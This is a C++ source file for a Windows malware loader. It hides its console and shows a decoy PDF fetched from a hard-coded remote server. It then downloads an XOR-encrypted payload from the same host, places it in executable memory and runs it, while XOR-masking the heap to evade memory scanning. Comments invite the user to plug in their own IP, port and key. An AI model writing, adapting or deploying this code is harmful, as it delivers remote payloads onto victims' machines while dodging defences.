#include <windows.h> 
#include <winhttp.h> 
#include <stdio.h> 
#include <Windows.h>
#include <iostream>
#include <vector>
#include <fstream>
#include <shellapi.h>
#include <shlwapi.h>
#include <winhttp.h> 

#pragma comment(lib,"winhttp.lib") 
#pragma comment(lib,"Shlwapi.lib") 
#pragma warning(disable:4996)


typedef struct Params {
    LPVOID pBaseAddress;
} PARAMS;

typedef VOID(*fprun)(PARAMS pParams);

void XOR(char* data, int len, unsigned char key) {
    int i;
    for (i = 0; i < len; i++)
        data[i] ^= key;
}

// Encryption Key
const char key[2] = "A";
size_t keySize = sizeof(key);

void xor_bidirectional_encode(const char* key, const size_t keyLength, char* buffer, const size_t length) {
    for (size_t i = 0; i < length; ++i) {
        buffer[i] ^= key[i % keyLength];
    }
}

PROCESS_HEAP_ENTRY entry;
void HeapEncryptDecrypt() {
    SecureZeroMemory(&entry, sizeof(entry));
    while (HeapWalk(GetProcessHeap(), &entry)) {
        if ((entry.wFlags & PROCESS_HEAP_ENTRY_BUSY) != 0) {
            xor_bidirectional_encode(key, keySize, (char*)(entry.lpData), entry.cbData);
        }
    }
}

int readPDF() {
    // Step 1: Initialize WinHTTP session
    HINTERNET hSession = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (hSession == NULL) {
        std::cerr << "WinHttpOpen failed: " << GetLastError() << std::endl;
        return 1;
    }

    // Step 2: Connect to the server
    HINTERNET hConnect = WinHttpConnect(hSession, L"103.182.16.8", 8082, 0);
    //HINTERNET hConnect = WinHttpConnect(hSession, L"255.255.255.255", 8082, 0);
    if (hConnect == NULL) {
        std::cerr << "WinHttpConnect failed: " << GetLastError() << std::endl;
        WinHttpCloseHandle(hSession);
        return 1;
    }

    // Step 3: Create request to download PDF file
    //HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/getpdfgetpdfgetpdfgetpdfgetpdfgetpdfgetpdfgetpdfgetpdfgetpdf", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/getpdf", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (hRequest == NULL) {
        std::cerr << "WinHttpOpenRequest failed: " << GetLastError() << std::endl;
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 1;
    }

    // Step 4: Send request to the server and receive response
    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        std::cerr << "WinHttpSendRequest failed: " << GetLastError() << std::endl;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 1;
    }
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        std::cerr << "WinHttpReceiveResponse failed: " << GetLastError() << std::endl;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 1;
    }

    // Step 5: Read the PDF content from the response and save it to a file in temp folder
    TCHAR szTempPath[MAX_PATH];
    if (GetTempPath(MAX_PATH, szTempPath) == 0) {
        std::cerr << "GetTempPath failed: " << GetLastError() << std::endl;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 1;
    }

    TCHAR szTempFileName[MAX_PATH];
    if (GetTempFileName(szTempPath, L"PDF", 0, szTempFileName) == 0) {
        std::cerr << "GetTempFileName failed: " << GetLastError() << std::endl;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 1;
    }
    PathRenameExtension(szTempFileName, L".pdf");
    std::cerr << "file failed: " << szTempFileName << std::endl;
    std::ofstream outFile(szTempFileName, std::ios::binary);
    BYTE* pBuffer = new BYTE[4096];
    DWORD dwBytesRead = 0;
    while (WinHttpReadData(hRequest, pBuffer, 4096, &dwBytesRead)) {
        if (dwBytesRead == 0) {
            break;
        }
        outFile.write(reinterpret_cast<char*>(pBuffer), dwBytesRead);
    }
    delete[] pBuffer;
    outFile.close();
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    std::cout << "PDF file saved to: " << szTempFileName << std::endl;
    ShellExecute(NULL, L"open", szTempFileName, NULL, NULL, SW_SHOWNORMAL);

    return 0;
}

//https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpconnect
int main()
{

    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
    readPDF();

    //--------- CONFIGURE -----------
    LPCWSTR remotehost = L"103.182.16.8"; //change to your IP
    //LPCWSTR remotehost = L"254.254.254.254"; //change to your IP
    int remoteport = 8082; //change to your port
    LPCWSTR remotedir = L"/getPayload"; //change to your directory of the hosted bin file
    //LPCWSTR remotedir = L"/getPayloadgetPayloadgetPayloadgetPayloadgetPayloadgetPayload"; //change to your directory of the hosted bin file
    unsigned char key = 0x7e; //change to your key
    //-------------------------------

    // Initialize variables 
    HINTERNET hInternet;
    HINTERNET hHttpSession;
    HINTERNET hHttpConnection;
    HINTERNET hHttpRequest;
    DWORD dwSize;
    BOOL bResults;
    DWORD dwStatus;
    DWORD dwStatusSize;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    std::vector<unsigned char> PEbuffer;

    // Initialize WinHTTP (change the first argument to a valid User-Agent instead)
    hInternet = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    printf("[+] WinHTTP initialized\n");

    // Connect to the HTTP server 
    hHttpSession = WinHttpConnect(hInternet, remotehost, remoteport, 0);
    printf("[+] Connected to HTTP Server\n");

    // Open an HTTP request 
    hHttpRequest = WinHttpOpenRequest(hHttpSession, L"GET", remotedir, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    printf("[+] Sending HTTP GET Request\n");

    // Send a request 
    bResults = WinHttpSendRequest(hHttpRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    printf("[+] WinHTTP request sent\n");

    // Wait for the response 
    bResults = WinHttpReceiveResponse(hHttpRequest, NULL);
    printf("[+] Response retrieved\n");

    do
    {
        dwSize = 0;
        if (!WinHttpQueryDataAvailable(hHttpRequest, &dwSize))
        {
            printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
        }

        // Allocate space for the buffer.
        pszOutBuffer = new char[dwSize + 1];

        // No more available data 
        if (!pszOutBuffer) {
            printf("[-] No more available data");
            dwSize = 0;
        }

        // Read the Data.
        ZeroMemory(pszOutBuffer, dwSize + 1);

        if (!WinHttpReadData(hHttpRequest, (LPVOID)pszOutBuffer,
            dwSize, &dwDownloaded))
            printf("Error %u in WinHttpReadData.\n", GetLastError());
        else
            PEbuffer.insert(PEbuffer.end(), pszOutBuffer, pszOutBuffer + dwDownloaded);

    } while (dwSize > 0);


    char* PE = (char*)malloc(PEbuffer.size());
    for (int i = 0; i < PEbuffer.size(); i++) {
        PE[i] = PEbuffer[i] ^ 0x7e; //XOR encrypted
    }
    
    //print payload
	for (int i = 0; i < PEbuffer.size(); i++) {
		printf("%02x", PE[i]);
	}


    printf("[+] Encrypted shellcode allocated in heap\n");

    // Set the base address of the current image.
    PARAMS pParams;
    pParams.pBaseAddress = (LPVOID)GetModuleHandleA(NULL);
    //printf("[+] Current image base address = 0x%p\n", pParams.pBaseAddress);
    LPVOID pBuffer = VirtualAlloc(NULL, PEbuffer.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (NULL == pBuffer) {
        printf("[!] VirtualAlloc failed\n");
        exit(1);
    }

    printf("[+] Allocated space for the buffer %p\n", pBuffer);
    XOR(PE, PEbuffer.size(), key); //decrypt the PE shellcode before writing to memory
    // Copy the shellcode into it.
    memcpy(pBuffer, PE, PEbuffer.size());
    printf("[+] Shellcode decrypted and written\n");

    //time for your creativity
    printf("[+] Encrypting the heap for 10 seconds\n");
    HeapEncryptDecrypt();
    Sleep(10);  //create your own sleep patch instead
    printf("[+] Decrypting the heap\n");
    HeapEncryptDecrypt();

    // Make a function pointer to the run function shellcode.
    fprun Run = (fprun)pBuffer;
    Run(pParams);

    // Close the HTTP request 
    WinHttpCloseHandle(hHttpRequest);

    // Close the session 
    WinHttpCloseHandle(hHttpSession);

    // Cleanup 
    WinHttpCloseHandle(hInternet);

    free(PE);

    return 0;
}